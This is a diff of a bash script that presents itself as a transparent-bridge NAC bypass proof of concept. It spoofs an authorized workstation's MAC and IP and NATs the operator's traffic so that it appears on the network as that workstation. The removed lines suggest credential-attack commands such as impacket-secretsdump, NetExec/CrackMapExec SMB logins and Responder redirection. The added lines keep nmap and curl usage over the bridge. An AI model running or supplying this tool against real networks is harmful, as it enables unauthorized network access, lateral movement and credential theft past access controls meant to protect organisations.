     if [ -f "$STATE_DIR/services_stopped" ]; then
         while IFS= read -r svc; do
             [ -n "$svc" ] && systemctl start "$svc" 2>/dev/null
         done < "$STATE_DIR/services_stopped"
     fi
 
-    # Hand interfaces back to NetworkManager                            HIGH-6
+    # Restore NetworkManager management
     if [ -n "$CMD_NMCLI" ] && [ -f "$STATE_DIR/nmcli_unmanaged" ]; then
         while IFS= read -r iface; do
             [ -n "$iface" ] && "$CMD_NMCLI" device set "$iface" managed yes 2>/dev/null
@@ -896,18 +854,17 @@ full_reset() {
     INITIALISED=0
     CONN_ACTIVE=0
 
-    # Persist a copy of the run log for forensics, then drop the state dir
+    # Persist the run log for forensics, then drop the state dir
     if [ -n "$RUN_LOG" ] && [ -f "$RUN_LOG" ]; then
         local ts; ts="$(date +'%Y%m%d-%H%M%S')"
         cp "$RUN_LOG" "/tmp/nac_bypass-$ts.log" 2>/dev/null || true
     fi
-
     state_clear
     ok "Cleanup complete."
 }
 
 #==============================================================================
-# Trap - guarantees cleanup on EVERY exit path.
+# Trap handlers - guarantee cleanup on every exit path.
 #==============================================================================
 install_trap() {
     [ "$TRAP_INSTALLED" -eq 1 ] && return
@@ -918,7 +875,6 @@ install_trap() {
     trap 'on_exit'        EXIT
     TRAP_INSTALLED=1
 }
-
 on_signal() {
     echo
     warn "Caught SIG$1 - tearing down before exit."
@@ -932,7 +888,6 @@ on_signal() {
         *)    exit 1   ;;
     esac
 }
-
 on_exit() {
     local rc=$?
     full_reset 2>/dev/null || true
@@ -940,80 +895,41 @@ on_exit() {
 }
 
 #==============================================================================
-# Operator banner
+# Banner & wait loop
 #==============================================================================
 ready_banner() {
     cat <<EOF
 
 ================================================================================
-  NAC BYPASS ACTIVE - this host is reachable on the wire as the workstation.
+  NAC BYPASS ACTIVE
 ================================================================================
-   Bridge interface : $BRINT  (link-local $BRIP/$BRMASK_BITS, gw $BRGW)
-   Switch-side NIC  : $SWINT  (mac $SWMAC)
-   Victim-side NIC  : $COMPINT
-   Victim identity  : $COMIP / $COMPMAC
-   Gateway          : $GWIP / $GWMAC
-   DNS              : $DNS_PRIMARY${DNS_SECONDARY:+, $DNS_SECONDARY}
-   SNAT range       : $COMIP:$SNAT_RANGE
-   State dir        : $STATE_DIR
+   Bridge        : $BRINT  (addr $BRIP/$BRMASK, fictional gw $BRGW -> $GWMAC)
+   Switch side   : $SWINT (mac $SWMAC)
+   Workstation   : $COMPINT
+   Identity used : $COMIP / $COMPMAC
+   Gateway       : ${GWIP:-?} / $GWMAC
+   SNAT range    : $COMIP:$SNAT_RANGE
 
-   Tools sourced from this host now appear on the network as $COMIP.
-   Run them in a SECOND terminal. Recommended invocations:
+   The workstation's own traffic continues to flow unmodified through the
+   bridge. This host now also egresses the wire as the workstation, and
+   replies to its traffic are reverse-NAT'd back here (NOT forwarded on).
 
-      nmap   -e $BRINT -S $BRIP -sT -p- <target>
-      nmap   -e $BRINT -S $BRIP -Pn -sS <target>     # raw SYN
-      ping   -I $BRINT <target>
-      curl   --interface $BRINT <url>
-      netexec smb <target>/24 -u <user> -p <pass>
-      crackmapexec smb <target>
-      impacket-secretsdump <user>@<target>
-      responder -I $BRINT                            # if -R supplied
+   Open another terminal and try:
 
-   Stop bridge + auto-cleanup: Ctrl+C in this terminal, or '$SCRIPT_NAME -r'.
+      ping  -I $BRINT  ${GWIP:-<gateway-ip>}
+      nmap  -e $BRINT -S $BRIP -sT -p 22,80,445,3389  10.0.0.0/24
+      curl  --interface $BRINT  http://internal.example/
 
+   Press Ctrl+C in THIS terminal to tear everything down and restore host.
 ================================================================================
 
 EOF
 }
 
-#==============================================================================
-# Continuous link-state monitor
-#==============================================================================
-monitor_loop() {
-    local prev=0 counter=0 cur
-    [ -z "$MONITOR_INTERFACE" ] && MONITOR_INTERFACE="$COMPINT"
-
-    log "Monitor loop on $MONITOR_INTERFACE (poll=${TIMER}s, up=${THRESHOLD_UP}, down=${THRESHOLD_DOWN}). Ctrl+C to exit."
-
-    # Treat the link as already UP at loop start (we just successfully armed)
-    prev=$(iface_carrier "$MONITOR_INTERFACE")
-
-    while :; do
-        cur=$(iface_carrier "$MONITOR_INTERFACE")
-        if (( cur != prev )); then
-            counter=0
-            if (( cur == 1 )); then log "$MONITOR_INTERFACE UP"; else log "$MONITOR_INTERFACE DOWN"; fi
-        else
-            ((counter++))
-            if (( counter == THRESHOLD_UP && cur == 1 )); then
-                if [ "$CONN_ACTIVE" -eq 0 ]; then
-                    log "Stable UP - re-arming masquerade"
-                    if learn; then
-                        install_masquerade
-                        ready_banner
-                    else
-                        warn "Re-arm failed; will retry on next state change."
-                    fi
-                fi
-            elif (( counter == THRESHOLD_DOWN && cur == 0 )); then
-                log "Stable DOWN - tearing down NAT (bridge stays)"
-                remove_masquerade
-                CONN_ACTIVE=0
-            fi
-        fi
-        prev=$cur
-        sleep "$TIMER"
-    done
+main_wait() {
+    log "Bridge is live. Press Ctrl+C to tear down."
+    # Simple sleep loop; traps do all the cleanup work.
+    while :; do sleep 60; done
 }
 
 #==============================================================================
@@ -1022,80 +938,67 @@ monitor_loop() {
 usage() {
     local rc=${1:-0}
     cat <<EOF
-$SCRIPT_NAME v$VERSION - transparent-bridge NAC bypass utility
+$SCRIPT_NAME v$VERSION - transparent-bridge NAC bypass POC
 
-Usage: $SCRIPT_NAME [options]
+Usage: $SCRIPT_NAME -1 <switch_iface> -2 <workstation_iface> [options]
 
-Bridge / interfaces:
-  -1 <iface>   NIC plugged into the switch        (default: $SWINT)
-  -2 <iface>   NIC plugged into the workstation   (default: $COMPINT)
-  -b <name>    Bridge name                        (default: $BRINT)
-  -I <iface>   NIC to monitor for link state      (default: same as -2)
-  -g <MAC>     Pin gateway MAC manually (skips learning of GW MAC)
+Required:
+  -1 <iface>   NIC plugged into the switch / IP phone
+  -2 <iface>   NIC plugged into the authorized workstation
 
-Egress configuration:
-  -d <ip>      Primary DNS                        (default: $DNS_PRIMARY)
-  -D <ip>      Secondary DNS ('' to disable)      (default: $DNS_SECONDARY)
-  -m <num>     Default-route metric for our br    (default: $ROUTE_METRIC)
-  -t <secs>    Learning timeout                   (default: ${LEARN_TIMEOUT}s)
+Identity pinning (skips passive learning when -V/-W/-g are all supplied):
+  -V <mac>     Workstation MAC
+  -W <ip>      Workstation IP
+  -g <mac>     Gateway MAC
+  -G <ip>      Gateway IP (informational only)
 
-Service redirection:
-  -R           Enable Responder DNAT (NetBIOS/LLMNR/HTTP/SMB/...)
-  -S           Enable sshd DNAT and start the service
+Tuning:
+  -t <secs>    Passive-learning timeout (default: ${LEARN_TIMEOUT}s)
 
 Other:
-  -r           Reset / cleanup any prior run and exit.
-  -v           Verbose (DEBUG logs).
-  -a           Autonomous (no interactive prompts; for unattended use).
-  -h           This help.
+  -r           Reset / cleanup any prior run and exit
+  -v           Verbose (DEBUG logs)
+  -h           This help
 
 The script ALWAYS cleans up on exit (Ctrl+C, SIGTERM, SIGHUP, error,
-normal completion). It runs setup, prints a banner with the flags your
-offensive tools should use, then enters a link-state monitor loop.
-Use a SECOND terminal to invoke nmap / NetExec / etc. against targets.
+normal completion). It runs setup, prints a banner, and blocks waiting for
+Ctrl+C. Run your offensive tools (nmap, NetExec, ping, curl, ...) from a
+SECOND terminal while the bridge is active.
 
 Examples:
-  sudo $SCRIPT_NAME -R -S                  # full pipeline + monitor + cleanup
-  sudo $SCRIPT_NAME -1 enp1s0 -2 enp2s0    # custom NICs
-  sudo $SCRIPT_NAME -r                     # clean up a prior run
+  sudo $SCRIPT_NAME -1 eth1 -2 eth2
+  sudo $SCRIPT_NAME -1 eth1 -2 eth2 -v
+  sudo $SCRIPT_NAME -1 eth1 -2 eth2 \\
+       -V 04:bf:1b:5d:95:e6 -W 10.40.240.10 \\
+       -g 00:11:22:33:44:55 -G 10.40.240.1
+  sudo $SCRIPT_NAME -r
 EOF
     exit "$rc"
 }
 
 parse_args() {
-    while getopts ":1:2:b:I:g:d:D:m:t:RSrvah" opt; do
+    while getopts ":1:2:V:W:g:G:t:rvh" opt; do
         case "$opt" in
             "1") SWINT="$OPTARG" ;;
             "2") COMPINT="$OPTARG" ;;
-            "b") BRINT="$OPTARG" ;;
-            "I") MONITOR_INTERFACE="$OPTARG" ;;
-            "g") GWMAC_USER="$OPTARG" ;;
-            "d") DNS_PRIMARY="$OPTARG" ;;
-            "D") DNS_SECONDARY="$OPTARG" ;;
-            "m") ROUTE_METRIC="$OPTARG" ;;
-            "t") LEARN_TIMEOUT="$OPTARG" ;;
-            "R") OPT_RESPONDER=1 ;;
-            "S") OPT_SSH=1 ;;
-            "r") OPT_RESET_ONLY=1 ;;
-            "v") OPT_VERBOSE=1 ;;
-            "a") OPT_AUTONOMOUS=1 ;;
-            "h") usage 0 ;;
+            V)   COMPMAC_USER="$OPTARG" ;;
+            W)   COMIP_USER="$OPTARG" ;;
+            g)   GWMAC_USER="$OPTARG" ;;
+            G)   GWIP_USER="$OPTARG" ;;
+            t)   LEARN_TIMEOUT="$OPTARG" ;;
+            r)   OPT_RESET_ONLY=1 ;;
+            v)   OPT_VERBOSE=1 ;;
+            h)   usage 0 ;;
             \?)  err "Unknown option: -$OPTARG"; usage 2 ;;
             :)   err "Option -$OPTARG requires an argument"; usage 2 ;;
         esac
     done
 
-    # Validate CLI args                                                 MED-2
-    if [ -n "$GWMAC_USER" ] && ! is_valid_mac "$GWMAC_USER"; then
-        err "Invalid -g MAC: '$GWMAC_USER'"; usage 2
-    fi
-    is_uint "$ROUTE_METRIC"   || { err "-m must be a non-negative integer (got '$ROUTE_METRIC')"; usage 2; }
-    is_uint "$LEARN_TIMEOUT"  || { err "-t must be a non-negative integer (got '$LEARN_TIMEOUT')"; usage 2; }
-    is_valid_ip "$DNS_PRIMARY" || { err "-d must be a valid IP (got '$DNS_PRIMARY')"; usage 2; }
-    if [ -n "$DNS_SECONDARY" ] && ! is_valid_ip "$DNS_SECONDARY"; then
-        err "-D must be a valid IP or empty string (got '$DNS_SECONDARY')"; usage 2
-    fi
-    [ -z "$MONITOR_INTERFACE" ] && MONITOR_INTERFACE="$COMPINT"
+    [ -n "$COMPMAC_USER" ] && ! is_valid_mac "$COMPMAC_USER" && { err "Invalid -V MAC: '$COMPMAC_USER'"; usage 2; }
+    [ -n "$COMIP_USER"   ] && ! is_valid_ip  "$COMIP_USER"   && { err "Invalid -W IP: '$COMIP_USER'";   usage 2; }
+    [ -n "$GWMAC_USER"   ] && ! is_valid_mac "$GWMAC_USER"   && { err "Invalid -g MAC: '$GWMAC_USER'";  usage 2; }
+    [ -n "$GWIP_USER"    ] && ! is_valid_ip  "$GWIP_USER"    && { err "Invalid -G IP: '$GWIP_USER'";    usage 2; }
+    is_uint "$LEARN_TIMEOUT" || { err "-t must be a non-negative integer"; usage 2; }
 }
 
 #==============================================================================
@@ -1104,24 +1007,27 @@ parse_args() {
 main() {
     parse_args "$@"
 
-    # Root check FIRST - before state_init / install_trap - so a non-root
-    # invocation can't trigger the cleanup path on a host that has nothing
-    # to clean up.
+    # Root check BEFORE we touch anything - so non-root invocations don't
+    # trigger spurious cleanup messages.
     [ "$EUID" -eq 0 ] || { err "Must run as root."; exit 1; }
 
     if [ "$OPT_RESET_ONLY" -eq 1 ]; then
-        # Resolve binaries enough to do cleanup; tolerate missing optional ones.
-        CMD_IP=$(resolve_bin ip);          [ -z "$CMD_IP" ] && die "ip(8) not found - cannot run reset."
+        # Resolve binaries needed for cleanup
+        CMD_IP=$(resolve_bin ip)
         CMD_IPTABLES=$(resolve_bin iptables)
         CMD_EBTABLES=$(resolve_bin ebtables)
-        CMD_ARPTABLES=$(resolve_bin arptables)
         CMD_NMCLI=$(resolve_bin nmcli)
-        CMD_SYSCTL=$(resolve_bin sysctl)
+        [ -z "$CMD_IP" ] && die "ip(8) not found - cannot reset."
 
-        # Pull persisted bridge name if state survived the previous run.    HIGH-2
+        # Recover the bridge name AND interface names from the state directory
+        # if a prior run left it behind. Without this, full_reset can't restore
+        # promisc/up state on the right NICs when called from a different shell
+        # (or after a kill -9 that bypassed the trap).
         if [ -d "$STATE_DIR" ]; then
-            local persisted; persisted=$(state_get bridge_name)
-            [ -n "$persisted" ] && BRINT="$persisted"
+            local v
+            v=$(state_get bridge_name); [ -n "$v" ] && BRINT="$v"
+            v=$(state_get swint);       [ -n "$v" ] && SWINT="$v"
+            v=$(state_get compint);     [ -n "$v" ] && COMPINT="$v"
         fi
         state_init
         INITIALISED=1
@@ -1132,17 +1038,16 @@ main() {
     state_init
     install_trap
     preflight
-
     host_lockdown
-    bridge_build
-    if learn; then
-        install_masquerade
-        ready_banner
-    else
-        die "Initial learning failed. Workstation may be idle - retry with longer -t, or pin -g <gw_mac>."
+    bridge_create
+
+    if ! learn; then
+        die "Initial learning failed. See above. Re-run with pinned values or after the workstation re-authenticates."
     fi
 
-    monitor_loop
+    install_masquerade
+    ready_banner
+    main_wait
 }
 
 main "$@"
